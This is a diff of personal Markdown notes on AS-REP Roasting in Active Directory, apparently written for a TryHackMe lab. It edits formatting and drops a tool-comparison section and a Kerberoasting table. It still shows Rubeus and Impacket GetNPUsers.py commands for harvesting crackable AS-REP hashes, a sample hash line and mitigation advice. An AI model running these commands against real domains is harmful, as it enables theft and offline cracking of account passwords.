@@ -32,7 +32,7 @@ Recover user password
 ### Vulnerable configuration
 
 ```text
-Do not require Kerberos preauthentication
+DONT_REQ_PREAUTH is enabled
 ```
 
 ---
@@ -86,7 +86,6 @@ Therefore, the attacker can attempt to recover the password **offline** without 
 Rubeus can automatically search for users with Kerberos pre-authentication disabled and request their AS-REP responses.
 
 ### Command
-
 ```cmd
 Rubeus.exe asreproast
 ```
@@ -107,16 +106,17 @@ The resulting hash can be transferred to the attacking machine and cracked with 
 # 2. AS-REP Roasting with GetNPUsers.py
 
 Impacket provides:
-
 ```text
 GetNPUsers.py
 ```
 
 It can check a list of domain users for accounts with Kerberos pre-authentication disabled and request AS-REP responses.
+
 ### Tool path
 ```text
 /home/eyad/.local/share/pipx/venvs/impacket/bin
 ```
+
 ### Command
 ```bash
 GetNPUsers.py spookysec.local/ \
@@ -192,64 +192,7 @@ $krb5asrep$23$svc-admin@THM-AD:...:password
 
 ---
 
-# 4. Rubeus vs. GetNPUsers.py
-
-Both tools can perform AS-REP Roasting, but their workflow is slightly different.
-
-### Rubeus
-```cmd
-Rubeus.exe asreproast
-```
-
-Automatically:
-```text
-Find vulnerable users
-        ↓
-Request AS-REP
-        ↓
-Output hashes
-```
-
-### GetNPUsers.py
-
-```bash
-GetNPUsers.py DOMAIN/ \
-    -usersfile users.txt \
-    -no-pass \
-    -dc-ip <DC_IP>
-```
-
-Typically:
-```text
-Obtain username list
-        ↓
-Test users
-        ↓
-Find vulnerable users
-        ↓
-Request AS-REP
-        ↓
-Output hashes
-```
-
-**Rubeus is convenient when operating from a Windows domain-joined machine, while `GetNPUsers.py` is useful for performing the attack remotely from an attacker machine.**
-
----
-
-# 5. AS-REP Roasting vs. Kerberoasting
-
-| |AS-REP Roasting|Kerberoasting|
-|---|---|---|
-|Target|User with pre-auth disabled|Account with an SPN|
-|Service account required?|No|Usually|
-|SPN required?|No|Yes|
-|Ticket/material|AS-REP|TGS|
-|Rubeus|`asreproast`|`kerberoast`|
-|Hashcat|`18200`|`13100`|
-
----
-
-# 6. Mitigation
+# 4. Mitigation
 
 ### Keep Kerberos Pre-Authentication Enabled
 
@@ -276,7 +219,6 @@ Monitor Kerberos authentication activity for unusual AS-REQ requests involving a
 > **AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.**
 
 The attack is:
-
 ```text
 Enumerate users
     ↓
